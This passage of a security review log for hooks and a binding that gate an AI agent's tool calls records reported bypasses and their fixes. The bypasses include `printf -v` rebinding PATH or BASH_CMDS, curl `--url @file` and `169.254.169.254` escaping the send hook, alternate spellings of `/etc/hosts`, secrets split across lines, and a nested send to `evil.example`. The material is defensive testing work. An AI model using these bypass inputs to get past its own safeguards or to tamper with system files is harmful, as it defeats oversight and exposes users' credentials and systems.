  rollback: 6 and 2; each under sh and bash) and the premise that bash
  expands each form. On a6c4136's hooks 52 of 83 fail; the 30 that pass are
  the 20 controls, the premise, and 10 refusals the old code made by luck
  (`.cl[]a]ude` read as `.cl.*.*a.*ude`, `git st[]a]sh` likewise).

#### 4. printf -v set PATH or BASH_CMDS for the rest of an audit-hook-checked line (medium); sibling: commands beside a recorded restore in the rollback hook

`printf` is on the audit hook's reader list with any option, and its
PATH/IFS rule read `NAME=value` words only: `printf -v
'BASH_CMDS[cat]' %s /usr/bin/tee` made `cat` run `tee`, which appended a
base64-decoded AKIA record to `records.jsonl`; `printf -v PATH D` ran
`D/cat`.

- Fix (audit): `printf` with an option, or a first word that may expand to
  one, is refused, as the SDK mapper refuses it; and a word that names
  `PATH`, `IFS`, `ENV`, `BASH_ENV`, `CDPATH`, `BASH_CMDS`, `BASH_ALIASES`,
  `LD_*`, `DYLD_*` or `OPENSSL_*`, alone, glued to an option (`-vPATH`),
  with a subscript or a value, is refused (F504, kind `assign`).
- Sibling (reproduced here): the rollback hook allowed `printf -v PATH %s
  D; git stash apply <recorded sha>`, so `D/git` ran as the restore. A line
  that restores a checkpoint may now hold beside the restore only commands
  that read (`git status|log|diff|show|rev-parse`, `echo`, `printf` with no
  option, `cat`, `ls`, `grep`, ...), with no variable set or named, no write
  but to `/dev/null`, and no word the shell expands; anything else (`cd`,
  `alias`, `hash`, a function such as `git() ( ... )`, `source`, `git
  config`, `export`) is F503 "runs beside a restore". The restore lines are
  checked first, so a restore of an unrecorded commit keeps its own
  message. `git status && git stash apply <sha>` still passes.
- Checked, not changed: the send hook refuses these names already (round 3
  #5, round 4 batch 3 #3); the plugin's pre-tool-use hook gates every such
  line (`;` or `|`) as `mutate`; the SDK mapper sends `printf` with any
  option to the worst case.
- Tests: `test_skill_hooks.py` `TestVariablesSetWithoutAssignment` (audit:
  10 refusals, the records file unchanged, and 3 controls; rollback: 12
  commands beside a recorded restore refused and 4 readers passed; each
  under sh and bash) and `test_printf_v_rebinds_a_reader` (the premise: bash
  appends the record through `tee`). On a6c4136's skills 44 fail; the 14
  controls and the premise pass.

#### Documentation

SECURITY.md §5.2 (the take hook's rule), §5.4 (the audit, rollback and
send rows: bracket expressions, `printf -v` and the names, commands beside
a restore) and §5.5 (the SDK adapter: the decision against the binding as
it is when it arrives); the hooks' README (the take hook, the glob reader); the
SDK guide (the recorder, the binding at the decision); the take hook's,
the audit and rollback skills' hook headers; CHANGELOG [Unreleased]
Upgrading (an SDK entry and the plugin's round-5 batch-3 entry). The
Standard's text was not changed: §5.18.6 already takes a checkpoint only by
a call classified `checkpoint`, §5.18.7 already counts a decision against
the binding's policy, and §5.18.10 and §6.7 already require the skills'
checks.

#### Checks after batch 3

- Python: `pytest tests/` file by file, each run under `timeout 120` and a
  4 GB address-space limit (`tests/test_skill_hooks.py` and
  `tests/test_redaction.py` in chunks of 100 node ids, `tests/test_discovery`
  as one run): 7855 passed, 19 skipped, of 7874 collected (7701 before, plus
  the 173 new). ruff check and format with CI's lists; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; `sync_skill_schemas.py
  --check` and the five generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed; not rebuilt.
- TypeScript: the package's build and test (2056 passed); the binding's
  check and test (263 passed, 2 skipped). No TypeScript source changed: the
  binding keeps its own approval rounds (round 1 #36) and no call fixture
  changed, so the adapter and the binding agree on the fixtures as before.
- Old code: the new tests against a6c4136's `grounded_agency/` (the
  recorder, the adapter), `hooks/` and the three skills (copied in place,
  then restored): #1 8 of 11 fail (the premise and 2 controls pass), #2 15
  of 19 (4 controls pass), #3 52 of 83 (20 controls, the premise and 10
  refusals the old reading made by luck pass), #4 44 of 59 (14 controls and
  the premise pass).
- Probes, each under `timeout 120` and a 4 GB address-space limit: the
  verifier's `vendor/evil.git` (the recorder takes none, the take hook with
  `core.worktree` the project writes no marker; the project's own stash
  still takes one); the bracket forms of the three hooks (each refused;
  `grep -E '[a-z]+'`, `ls file[12].txt`, `git add [abc].py` pass); the
  audit hook's `printf -v` lines (each refused, `printf '%s\n' ... >>
  records.jsonl` passes); the rollback hook's commands beside a recorded
  restore (each refused, `git status && git stash apply <sha>` passes); a
  fuzz of the glob reader against bash (no name missed) and its time on 16
  KB words (about a second). No CLI or nested agent was started; the
  scratch repositories and fuzz files were removed.

### Batch 4: five reported defects

Five defects, each reproduced by an independent verifier on 4d17c00, and
reproduced again here on b5e4174 before any change (probes under `timeout
120` and a 4 GB address-space limit, Node with its heap bounded, inputs of
at most 1 MB, in scratch directories since removed): the bare scan
(`secret_in`) said no to `password:\nXyz12345abcdef`, `API_KEY=\r\n"..."`,
`Authorization:\nBearer ...` and `Bearer\n...`, which the SDK's
`holds_credential` and the built TypeScript `holdsCredential` refuse, and
the plugin hook let the reported `TodoWrite` (a YAML value under
`password:`) pass with no ask while the adapter refused it, as did the
persist hook a `Write` of it and the audit hook a record holding it; an
Edit that put a key body into `DEPLOY.md` between its BEGIN and END lines
exited 0, as did the body before an END line and the MultiEdit form; the
send hook let `curl -q --url @urls`, `--url @-`, `--url=@urls`, `curl -q
@urls`, `-- @urls` and `--url=169.254.169.254/...` pass; it let `curl ...
--output-dir /etc -o hosts`, `cd /etc && ... -O`, `wget -P /etc`, `tee -a
/etc//hosts`, `cp x /etc/./hosts` and `cp x /etc/nonexistent/../hosts`
pass, and its Write hook `/etc/nonexistent/../hosts`; and in the binding
an approval attested as an agent's, given 50 s after the person's, covered
a nested `write` that needs a person once the person's had expired
(grounded and plain). None was fixed by an earlier batch: round 4 batch 1
#4 bounded the scan's `-o` stages per line, and every rule stayed a
line-at-a-time `grep`; round 1 batch 5 and round 3 batch 2 made the persist
hook read the added lines, not the lines around them; round 3 batch 3 and
round 4 batch 4 read curl's options from a table with no `--url`; the setting
files were read as one regular expression per word; SECURITY-LOOP round 1
#36 and round 4 batch 5 made `decisionsCover` read the composite's request,
not the decisions its call counted. Each fix has tests that fail on the
code before it (below).

#### 1. The shared secret scan read one line at a time, so a value on the line after its name passed (medium); siblings: the audit hook's record strings, the persist hook's texts

Every rule was a `grep` over the text, which reads a line at a time, so
`[[:space:]]*` after `password:`, `=` or `Bearer` never crossed a line
break, where the SDK's `_WS` and the TypeScript `WS` do.

- Fix (`hooks/secret_scan.sh`, copied into the pre-tool-use and log hooks
  and the persist and audit skills): `secret_lines` holds the rules, each
  line read on its own; `secret_in` reads the text with it and again with
  `\n` and `\r` read as blanks (`tr`). `secret_values` lists what the rules
  whose match may hold whitespace find (`SECRET_SPACED`, the bearer and
  key-header shapes; `SECRET_QUOTED`, the quoted rule, now a variable; and
  the value rules, ending in output, not `-q`); `secret_lines` runs
  `SECRET_ERE` and the URL rule with `-q` and then `secret_values | grep -q
  .`. The per-run bounds stay: no new `-o` stage reads a run again from
  each position (the folded reading is one line, as any one-line input
  already was).
- Callers that join texts read apart keep them apart: the plugin's persist
  check gives each string of the input once as it is and once folded, each
  on a line of its own, then the JSON text, to `secret_lines` (as the
  adapter reads each string; a name ending one todo and a value opening
  the next pass both); the audit hook gives each decoded string of the
  record the same way; the persist hook its texts (below). The log hook's
  names hold no line break.
- Vectors: nine added to `tests/conformance/secrets/credentials.json`
  (seven holding, among them a YAML value, a credential option and a
  name/value pair with each part on its own line; two prose), run by the
  Python, TypeScript and shell tests and, as a todo's content, by the
  hook-and-adapter agreement test.
- Tests: `test_skill_hooks.py` `TestCredentialsAcrossLines` (the scan on the
  six reported shapes, `secret_lines` reading lines apart, the folded
  reading in linear time on 400 KB of line breaks in six shapes, the
  persist `Write` and the audit record refused, two records passed) and
  `test_pretooluse_hooks.py` `test_a_value_on_the_next_line` (the reported
  `TodoWrite` and three more refused by the hook and the adapter alike; two
  controls pass both). On b5e4174's hooks and skills 30 of 46 of the
  first fail (the 12 timing tests and the 4 controls pass), and 5 of 27 of
  the plugin hook's persist tests (the four line-spanning todos and the
  vector agreement test; the controls pass).

#### 2. The persist hook read a key's body, or a value under a name the file holds, one added line at a time (medium); siblings: a name put over a value, a line taken out, a pair split over six lines

The hook scanned the lines the file would hold that it did not hold
before, each on its own; a private key is recognised by its BEGIN line,
which the edit left as it was, and a value put under `password:` matched
no rule alone.

- Fix: the jq stage keeps the added lines and computes the lines the call
  changes (from the first that differs to the last, counted from each end),
  with the six lines that are not blank on each side, after the call and
  before it (the same context lines): no rule's match spans more than five
  runs of whitespace (the pair and tuple rules), so one the change builds
  with the lines around it lies in the window. Each window is read folded
  (and decoded, on both sides alike where either changes), and a value
  `secret_values` reads more often after the call than before is refused
  (F504; `awk` compares the lists, and a missing `awk` is R407). A
  credential the window held already is listed as often on both sides, so
  a file that holds an example can still be edited beside it (the round 1
  test that keeps that passes).
- A changed line within a private key block, from a BEGIN line (`-----BEGIN
  [A-Z0-9 ]*PRIVATE KEY( BLOCK)?-----`) to its END line (the SDK's form) or
  the end of the text, is refused (jq exit 4, F504): the body lines match
  no rule. A line is tested with a regular expression only where it holds
  `PRIVATE KEY` and the marker, and a text without `PRIVATE KEY` skips the
  pass; a block removed whole, or a change below its END line, passes.
- Each text (each carried string, the added lines) is read on its own,
  line by line and folded (`secret_lines`), so two edits' strings are not
  read as one.
- Time: an Edit at either end of a 1 MB file (whole-file windows) takes
  about 1.4 s; 900,000 blank lines about 10 s (7 s before); the 4 MB test
  of round 3 passes within its 15 s.
- Tests: `TestPersistReadsTheLinesAroundAChange` (four key-block changes,
  six credentials built with the lines around them, five controls). On
  b5e4174's persist hook 18 of 30 fail; the 10 controls pass, and the
  Authorization case, whose added line holds `Bearer` and the token whole.

#### 3. The send hook read curl's `--url @file` as a host named `file`, and never read a `--url=` value (medium); siblings: an `@file` operand, the audit hook

curl 8.13 and later reads the URLs of `--url @file` (`@-` its input) from
that file, and of an operand `@file` too (every operand goes through
`--url`); 8.16 and later reads `--url=VALUE`. The hook's curl table had no
`--url`, so `@urls` was an operand whose host after `@` was `urls`, and
`--url=127.1:18777` an option with no value read.

- Fix (send): `operand`, shared by every operand, refuses a curl operand
  that starts with `@` (kind `redirect`, the message naming `--url @file`);
  `--url=VALUE` (or an abbreviation of `--url` of 4 or more characters with
  `=`) is read as an operand, so its host is checked; `--url VALUE` was
  already read so. Data, header and form files (`-d @f`, `-H @h`) are
  option values and pass.
- Fix (audit): curl with `--url @file`, `--url=@file` or an `@file` word that
  is not the value of a short option that takes one or of a data, header
  or form option is refused (`--url @file` implies `--remote-name`: curl
  names the files it writes after URLs this check does not read).
- Checked: the SDK adapter refuses every Bash send under a destination
  policy and reads no URL; the plugin's pre-tool-use hook gates every such
  call; this container's curl is 8.5.0, so curl's reading was checked in
  its source by the verifier, not run.
- Tests: `TestCurlUrlsFromAFile` (send: ten refused as URL files, seven
  `--url` values read as internal hosts, six controls; audit: seven
  refused, four controls). On b5e4174's skills 46 of 68 fail; the 20
  controls pass, and `--url 127.0.0.1`, which the old reading took as an
  operand.

#### 4. The send hooks read `/etc/hosts` only as written (low); siblings: `//`, `/./` and `..` in any command, a name written after `cd`, the Edit hook's `/././`

The Bash rule matched each word against `/etc/hosts` as one string, with
no tidying and no directory a command changes to; the gate did not read a
command naming `/etc//hosts` at all; the Write hook's `sed` took out one
`/./` of a run and did not read `..`.

- Fix (Bash): a word is also matched tidied (repeated slashes and `.`
  segments taken out), a word with a `..` segment whose last component is
  a setting file's (`hosts`, `resolv.conf`, `gateway`, `config.json`,
  `curlrc`, `wgetrc`) is refused, and where any word of the line may change
  the directory (`cd`, `pushd`, `popd`, `--output-dir`, `-P`,
  `--directory-prefix`, `--chdir`, a cluster with `C`, `D` or `P`) or the
  call's `cwd` is `/etc`, `~/.ipfs` or HTTPie's directory, a word or a URL
  whose last component is one is refused (kind `file`). The gate reads a
  command naming `hosts` as a word or a path's last component.
- Fix (Edit/Write): the `/./` substitution loops, and a path with a `..`
  segment whose last component is a setting file's is refused (links on
  its way decide what it reaches; the verifier found Claude Code
  normalises a file tool's path first, so this matters on another host).
- Tests: `TestSettingFilesInOtherSpellings` (twelve commands, the call run
  in `/etc`, four paths refused; six controls). On b5e4174's send skill 30
  of 46 fail; the 12 controls pass, and `/etc//hosts` and `/etc/./././hosts`
  in the Write hook, whose parent exists, so `readlink -f` resolved them.

#### 5. The binding covered a nested call by an approval the composite's call did not count (medium)

`decisionsCover` counted every approval in the composite's request still
valid at the nested call, though the composite's call, under a person
requirement, counted only a person's: an agent's approval given after the
person's covered a nested call that needs a person once the person's had
expired (§5.18.4, §5.21.3).

- Fix: the claim's `authority`, which the nesting token and `invokePlain`
  read, is the request with only the decisions the call counted
  (`counted`, person-filtered), or the covering token's, so
  `decisionsCover` counts no other on either path, at any depth.
- Python: the adapter does not see nested calls (its statement), so it has
  no sibling; no call fixture holds approver kinds or a clock, so the
  binding's tests carry the case.
- Tests: `profiles.test.ts` "a nested call is covered only by the decisions
  the composite's call counted" (grounded and plain: refused with F502,
  nothing written; controls with no agent's approval, and a person's
  approval still valid, which covers). On b5e4174's `grounded.ts` the two
  probes fail and the three controls pass.

#### Documentation

SECURITY.md (the secrets section: the scan's line breaks, the persist
hook's windows and key blocks; the pre-tool-use hook's persist check; the
audit, persist, send and send-Edit rows; the binding's coverage by counted
decisions), the hooks' README (the scan's three functions), the send,
persist and audit hooks' headers, CHANGELOG [Unreleased] Upgrading (the
plugin's round-5 batch-4 entry, the binding's composites entry). The
Standard's text was not changed: §6.7 lets a host choose its recogniser and
§5.18.10 requires the persist check; §5.18.4 already covers a nested call
by "the decisions the composite's call counted".

#### Checks after batch 4

- Python: `pytest tests/` file by file, each run under `timeout 120` and a
  4 GB address-space limit (`tests/test_skill_hooks.py` and
  `tests/test_redaction.py` by test function, in runs of at most 120
  tests, the long-text redaction test in runs of 8; `tests/test_discovery`
  as one run): 8096 passed, 19 skipped, of 8115 collected
  (`test_evidence_performance`'s 1 s insert test, which ran beside the
  TypeScript suites, passed alone). ruff check and format with CI's lists;
  mypy; every `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py
  --strict` and every domain catalog and example `--strict`;
  `sync_skill_schemas.py --check` and the five generators' `--check`;
  `scripts/run_conformance.py`.
- Rust: no Rust source changed; not rebuilt.
- TypeScript: the package's build and test (2074 passed: the nine new
  credential vectors, as text and as a todo); the binding's check and test
  (268 passed, 2 skipped).
- Old code: the new tests against b5e4174's `hooks/`, skills and
  `grounded.ts` (copied in place, then restored): #1 30 of 46 and 5 of 27,
  #2 18 of 30, #3 46 of 68, #4 30 of 46, #5 2 of 5 fail; the controls pass
  (and the few refusals the old reading made by luck, above).
- Probes, each under `timeout 120` and a 4 GB address-space limit (Node
  with its heap bounded), inputs of at most 1 MB: the reported texts
  through the scan, the plugin hook (a scratch git repository) and the
  adapter; the persist hook on the reported `DEPLOY.md` edit, its siblings
  and controls, and its time on 1 MB files (whole-file windows about 1.4
  s; 900,000 blank lines about 10 s, 7 s before); the send hook's 19
  `--url` refusals and 8 controls, and its 14 setting-file refusals, 7
  controls and 7 Write paths; the audit hook's curl lines and records; the
  binding's two scenarios and controls. No CLI or nested agent was
  started; the scratch directories were removed.

### Batch 5: four reported defects

Four defects, each reproduced by an independent verifier on 4d17c00, all in
the TypeScript binding (and its lint's package function), and reproduced
again here on 84960fc before any change by the tests below (the binding's
vitest under `timeout 120` and a 4 GB address-space limit, the memory
runtime of `test/memory_thread.ts` with a runtime that parses a tool's
arguments with its zod schema): a grounded call returned, unredacted, the
R407 of a `secrets` function that threw a vault token, the R407 of a check
whose store write threw a database password, the tool's own error with a
token in a URL, an R402 naming an output member that is a token, and an
F502 whose `error_data.shown` held an `Authorization` header, while its
trace entries were redacted; a composite whose profiles allow only
`ok.example` got its nested `notify` sent to `evil.example` once the
runtime added a zod default (or stripped a key) to the arguments, after a
person approved the nested call's own request; `lintAgentBindings` passed a
stop tool whose profiles (its own or the layer's) make it need approval or
a checkpoint, which its call is then refused for, and `lintPromptTools`
passed the raised checkpoint with no checkpoint tool offered; and a
composite running outside an execution (an endpoint's state, or at rest)
gave its nested grounded call none of its profiles' minimum confidence,
grounding and destination policies, so an output at confidence 0.12 was
accepted and counted as executed, and an inner composite's unregistered
name ran a sender while the outer composite's destination policy was in
force. None was fixed by an earlier batch: round 4 batch 5 redacted only
the refusals of `nestingState`; round 4 batch 4 put the composite's output
rules on the token, which a call takes only by its digest, stated name and
execution; the lint has read the record alone since S1. Each fix has tests
that fail on the code before it (below).

#### 1. A grounded tool's returned refusals and failures held secrets its trace entries redact (medium); siblings: a nested result, a control tool's error, the SDK adapter's ask reason

Only `nestingState`'s refusals went through `redactedRefusal`. Every other
result `execute` returned (each `refusal(...)` of `check` and `execute`,
the R402 built from `cause.diagnostic`, `{status: 'error', error:
message}` for the tool's own error, the F502 with `shown`) reached the
runtime, the thread's messages and the model as built, though §6.7 keeps
secrets out of a diagnostic (§9.8) and a returned Error message.

- Fix (`grounded.ts`): the call is `callOf`, which notes the secrets it
  read; `execute` returns its result as it is when it is a success and
  through `redactedRefusal` (the call's secrets, the default patterns and
  the layer's; the layer's alone when the secrets could not be read)
  otherwise. An F502's `shown` arguments have their secrets replaced, and
  its `digest` stays that of the values (§6.7: a channel may show them
  with secrets replaced); the approvals endpoint still shows the request's
  values, which the approver decides on.
- Sibling: the nesting state's `invokeTool` redacts every result that is
  not a success, whichever tool the runtime ran (a nested grounded call's
  own failure through it, a nested plain tool's own error, which the trace
  redacted); `controlTool` redacts its own error result.
- Sibling (Python): the SDK adapter's PreToolUse `decide` built an ask's
  reason (`_approval_request`, F502) with the tool's name verbatim, though
  the call record redacted it; a refusal's reason came from `_refuse`,
  already redacted. `decide` now redacts every reason, and the ask's log
  line is redacted too. The plugin's pre-tool-use hook already gave
  `[REDACTED]` for such a name (round 5 batch 2).
- Observed, not changed: the redactors' default patterns read a token only
  at a word boundary, so `mcp__srv__ghp_...` keeps its token in both the
  binding and the adapter (a registered value is replaced anywhere); the
  plugin's hooks read a name by a grammar instead. §6.7 leaves the
  recogniser to the host.
- Tests: `evidence.test.ts` "what a grounded call returns holds no secret"
  (the five reported cases, a control tool's error, a success unchanged)
  and `nesting.test.ts` "what an invocation through a composite's state
  returns holds no secret" (a nested grounded failure and a nested plain
  error, a nested success unchanged); `tests/test_redaction.py`
  `test_layer_asks_with_no_secret_in_its_reason` (a token and a registered
  value). On 84960fc's `grounded.ts` 8 of 10 binding tests fail (the two
  controls pass); on its `adapter.py` both Python cases fail.

#### 2. A nested send whose arguments the runtime validates escaped the composite's profile destination policy (medium); siblings: grounding and minimum confidence, a listed tool stating another name

`check` took the enclosing destination policies, grounding policies and
minimum confidence only from the token `findToken` matched, by the
arguments' digest, the stated name and the execution. The runtime gives a
tool its validated arguments, so a zod `.default()`, `.transform()` or a
stripped key changed the digest, and a listed tool whose stated name is
not the name it is invoked under never matched: the nested call was
checked on its own, against the layer's policies and its own profiles'.

- Fix: `pendingRules` joins the rules of every token pending in the thread
  for the tool (by the invoked name or by the listed tool itself, the new
  `listed` member), whether or not the call takes one, used or not, open or
  not; `check` applies them to the send (before approval) and the output
  (`enclosing`, `enclosingGrounding`, `enclosingMinimum`), and a composite
  passes them on to its own nesting state. Coverage is unchanged: such a
  call takes no token and asks its own approval and checkpoint. The layer
  cannot tell such a nested call from another call of the tool made at that
  moment (a parallel call, an endpoint's), so it holds that call to the
  rules too (§5.18.10: a layer that cannot tell refuses).
- Considered, not changed: a call queued through a composite's state runs
  after the composite's call as a call of its own (§5.18.4) with the layer's
  and the tool's own policies, which a direct call has too; a tool invoked
  in another realm finds no token (host gap 1 of the statement).
- Tests: `nesting.test.ts` "the rules of a composite's profiles reach its
  nested grounded calls whatever the token": the reported zod default and a
  stripped key (F504 twice, nothing sent, no request of the nested call
  made), a listed tool stated as `notify_v2`, a minimum confidence and a
  grounding policy with changed arguments; controls with the arguments
  unchanged (F504, as before) and an allowed destination (asks its own
  approval). On 84960fc's `grounded.ts` 4 of these fail.

#### 3. `lintAgentBindings` missed F506 for a stop tool its profiles make refusable (medium); sibling: `lintPromptTools` V102

The lint built records from the annotations (`annotationRecord` drops the
effective-flag copies) and `checkBindings` computed the flags from the
ontology and the declared flags, without the domain profiles the tool
applies, which raise effective flags (§5.21.3).

- Fix (package): `checkBindings` takes `raised`, the flags a layer applies
  to a loaded tool beyond its record by its `tool`, joined into its
  effective flags (in what it returns and in the checks of the offered
  tools); a control-only tool is never raised. Binding: `computedFlags`
  (`grounded.ts`) gives a tool's computed flags (`EFFECTIVE`), and
  `recordsOf` passes them for each tool defined here to both lints.
- Python: `check_offered` checks the mappings it is given; the mapper's
  `map_tool` gives them with the profiles' flags (`_apply_profiles`), so it
  agrees when given those (docstring and `claude_agent_sdk.md` say so).
- Tests: `grounded.test.ts` "flags the applied profiles raise" (the tool's
  own profiles and the layer's raising approval, F506 with the call F502;
  a raised checkpoint, F506, and V102 until a checkpoint tool is offered,
  with the call F501; a control); the package's `bindings.test.ts` "flags a
  layer raises beyond the record" (F506, V102, a control-only tool and an
  unnamed tool not raised); `tests/test_profiles.py`
  `test_check_offered_reads_the_flags_the_profiles_raise` (healthcare:
  F506 with `map_tool`'s mapping, none with the record's alone). On
  84960fc's `lint.ts` 3 of 4 binding tests fail, and on its `binding.ts` 2
  of 3 package tests (the controls pass); the Python test passes on both
  (no Python code changed).

#### 4. A composite running outside an execution issued no nesting token, so its profiles' rules skipped its nested grounded calls (medium); sibling: an enclosing destination policy and unregistered names

`nestingState.invokeTool` returned `state.invokeTool(tool, args)` for a
flow-null composite before any token was built, so the composite's
grounding, minimum confidence and destination policies (its profiles' and
those enclosing it) never reached a nested grounded call, though a plain
one got them from `invokePlain`; and a nested composite's own nesting
state lacked the enclosing destination policy, which `refusalOf` reads for
an unregistered name.

- Fix: the early return is gone; a flow-null composite issues tokens too
  (`flow: string | null`). `findToken` still matches none outside an
  execution, so they cover nothing (no approval or checkpoint authorises
  such a call), and `pendingRules` carries their rules (#2).
- Tests: in the same `nesting.test.ts` block: a nested output below the
  minimum confidence (F504) or not grounded (F505), recorded `failed` and
  not counted as executed, in an execution, in an endpoint's state and at
  rest; an inner composite's unregistered name refused (F504, nothing sent)
  under the outer composite's destination policy from an endpoint's state;
  a control output that meets the rules in no execution. On 84960fc's
  `grounded.ts` 3 of these fail (the execution case and the control pass).

#### Documentation

SECURITY.md (the binding's secrets bullet: every result redacted, an
F502's `shown`, the adapter's decision reasons; the SL paragraph: rules on
every call of a tool with a pending invocation, the lint's computed flags,
`check_offered`), the Standard Agents guide (the secrets bullet, a
composite's "Rules that reach a nested call without a token", the lint
table, the guarantees row on tokens), the binding's statement (host gap 2:
a changed argument or new execution asks its own approval, the rules still
apply), `claude_agent_sdk.md` (`check_offered` with `map_tool`'s
mappings), `grounded.ts` and `lint.ts` comments, CHANGELOG [Unreleased]
Upgrading (Python tool calls; the binding's composites and secrets
entries; the package and lint entry). The Standard's text was not changed:
§6.7 already keeps secrets out of a diagnostic and a returned Error
message, §5.21.3 makes raised flags effective flags (§5.18.3 F506 reads
those), and a layer may hold a call it cannot attribute to stricter rules
(§5.18.4 checks it as a call of its own; §5.18.10).

#### Checks after batch 5

- Python: `pytest tests/` file by file, each run under `timeout 120` and a
  4 GB address-space limit (`tests/test_skill_hooks.py` and
  `tests/test_redaction.py` by test, in runs of at most 60 and 120, their
  timing tests in runs of 8): 8099 passed, 19 skipped, none failed (the
  three new tests included). ruff check and format with CI's lists; mypy;
  every `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py
  --strict` and every domain catalog and example `--strict`;
  `sync_skill_schemas.py --check` and the five generators' `--check`;
  `scripts/run_conformance.py`.
- Rust: no Rust source changed; not rebuilt.
- TypeScript: the package's build, check and test (2077 passed: three new
  `raised` tests); the binding's check and test (293 passed, 2 skipped: 25
  new).
- Old code: the new tests against 84960fc's `grounded.ts` and `lint.ts`
  (copied in place, then restored): 18 of 25 fail, the 7 controls (and the
  in-execution case, which the token already covered) pass; against its
  `binding.ts`, 2 of 3 package tests fail; against its `adapter.py`, both
  Python ask cases fail.
- No CLI or nested agent was started; the scratch outputs were removed.

### Batch 6: three reported defects

Three defects, each reproduced by an independent verifier on 4d17c00, and
reproduced again here on da18a8f before any change (a scratch probe of the
Python redactor, the TypeScript package's built `redact.js` and the shell
scan, under `timeout 120` and a 4 GB address-space limit): a session cookie
in text (`Cookie: sessionid=<SID>`, `Set-Cookie: session=<SID>; Path=/`,
`{"Cookie": "sessionid=<SID>"}` as text, a headers dictionary's repr,
`curl -b 'sessionid=<SID>'` and `curl --cookie ...`) was neither redacted
nor refused by any of the three, while the same cookie as a JSON member
was; JSON text escaped by other encoders (`mysql:\/\/app:<pw>@db\/app` as
PHP writes it, `{\u0022password\u0022:\u0022<pw>\u0022}` and an
`Authorization` header the same way, as .NET writes JSON inside JSON) was
neither, and a registered value holding `&`, `<`, `>`, `'`, `+` or `=` was
kept as Go's `encoding/json`, Gson or .NET escape it; and a `.netrc`
password, an Azure `AccountKey`, Stripe, Google, GitLab, npm, Vault and
SendGrid tokens, a Slack webhook, `AUDIT_HMAC_KEY=`, `SIGNING_KEY:` and
`credential=` were neither, and the plugin's scan let a todo holding
`AUDIT_HMAC_KEY`'s value through. None was fixed by an earlier batch: round
1 batch 6 #32 read a `Cookie` header only as a pair, a tuple or a member in
data, and listed a `Cookie:` header line in text as not read; round 1 batch
8 registered only the Python and JavaScript JSON forms and the
percent-encoded ones; no scan registered a value of its own. Each fix has
tests that fail on the code before it (below).

#### 1. Session cookies in text were neither redacted nor refused (medium); siblings: a quoted `Authorization:` line before a run of blanks, the shell scan's tuples and pairs

- Fix (`redaction.py`, `redact.ts`, identically): a `Cookie` or
  `Set-Cookie` header's value is redacted whole, read as the
  `Authorization` header's is: a quoted member (`"Cookie": "..."`, a
  repr's `'Cookie': '...'`) and a header line quoted whole (`-H 'Cookie:
  ...'`, a command's list of arguments) to the closing quote; a header line
  from its first character that is not a blank to the end of its line (a
  cookie string holds blanks: `a=1; sid=...`; a Set-Cookie line's
  attributes go with it); after `=` or a quote that does not close on its
  line, to a blank, `,` or `;`. curl's cookie option (`-b`, `--cookie`, as
  its user option is read: glued, after `=`, blanks or as a list's next
  item) is redacted when its value holds a cookie: a name and `=` within
  its first 64 characters, so a cookie file's name (`-b cookies.txt`) and
  another program's `-b` (`git checkout -b feature-2024`) stay.
- The refusal rule (`holds_credential`, `holdsCredential`, the shell's
  `secret_values`) reads the same values (a header's to the end of its line
  or its closing quote; the option's quoted, to its closing quote, or to a
  blank) and refuses one holding a cookie, `name=value` between `;`, `,`
  and blanks, whose value is 8 or more token characters (with `%`)
  mixing letters and digits, a Set-Cookie attribute (`Path`, `Domain`,
  `Expires`, `Max-Age`, ...) aside. A piece with no `=` is not read: prose
  after `Cookie:` passes (`Cookie: none are set before login 2`), and so do
  `Set-Cookie: theme=dark; Path=/api/v2; Domain=app2.example.com`, a cookie
  file's name and `git checkout -b release2024x`.
- Sibling (found here): `_quoted_forms(r"(?<!\\)", "...authorization{_WS}*:
  {_WS}*...")` let the value of a header line quoted whole start inside the
  blanks after its colon, so `"Authorization:` and a run of blanks with no
  closing quote read the run again from each blank: 3.9 s for 10 KB, 15.7 s
  for 20 KB, 67 s for 40 KB in Python. The blanks there, and after one of
  the five schemes (`_VALUE_SCHEME`, also inside a quoted member, a pair or
  a tuple), are now read whole (`_BLANKS`: blanks then no blank, a
  possessive run in both languages), and the Cookie forms are built the
  same way.
- Sibling: the shell scan's pair and tuple names allowed a backslash, which
  the Python and TypeScript names no longer do (#2); the three agree.
- Tests: vectors `cookie_header_line`, `set_cookie_header_line`,
  `cookie_member_in_text`, `cookie_header_quoted_whole`,
  `curl_cookie_option` (with the cookie file and `-b` branch controls) and
  `authorization_quoted_blank_run` in `redact.json`; `cookie_header`,
  `set_cookie_header`, `cookie_member_in_text`, `cookie_member_in_repr`,
  `cookie_header_in_prose` (the reported todo), `curl_cookie_option`,
  `curl_cookie_long_option`, and the controls `cookie_prose`,
  `set_cookie_attributes`, `cookie_file_and_branch` in `credentials.json`
  (Python, TypeScript, the shell under sh and bash, and the plugin's hook
  against the adapter); `tests/test_runner_secrets.py`
  `test_a_host_error_quoting_a_cookie_an_escaped_value_or_a_service_key_keeps_none_of_it`
  (the reported `CalledProcessError`, a Set-Cookie line, a headers repr and
  `{"Cookie": ...}` text, none of them in the message, trace, records or
  snapshot); new 1 MB shapes (`cookie: a `, `set-cookie:`, `'cookie: a `,
  `.-b`, `-b 'a `, `--cookie a`, `"Authorization:` then blanks, `'Cookie:`
  then blanks, ...) in both SDKs' timing tests and in the shell scan's.

#### 2. JSON escaped by other encoders defeated redaction and refusal, and registered values were not read in their HTML-safe forms (medium); siblings: Gson's `=`, a token after an escaped quote, the plugin hook's one JSON level

- Fix, redaction in place (`redaction.py`, `redact.ts`): a quote may be
  written as its JSON escape (`_QUOTE` takes `\\+u0022` and `\\+u0027`; a
  quoted value opens and closes on either form of its quote, and a value
  character stops at an escaped one); a member's name may open with one
  (`_QUOTED_SECRET_NAME`, read after the escape's backslash; a name holds no
  backslash now, so an attempt reads to the next quote, backslash or blank);
  `=` may be written `\u003d` (`_SEP`, Gson); a URL's slashes may be
  escaped (`:(?:\\*/){2}`, PHP); and a word that starts a token, a header or
  an option may start right after an escaped quote (`_after`: the escape's
  last character is a digit, so `\b` and the `(?<![...])` starts missed
  `\u0022ghp_...`).
- Fix, refusal (Python, TypeScript and `hooks/secret_scan.sh` alike): the
  rule reads a text with the JSON escapes other encoders write for the
  characters it reads decoded (`_decoded`, `decoded`, `secret_decoded`): a
  quote's as an escaped quote (`\"`, `\'`: it stays a quote inside a JSON
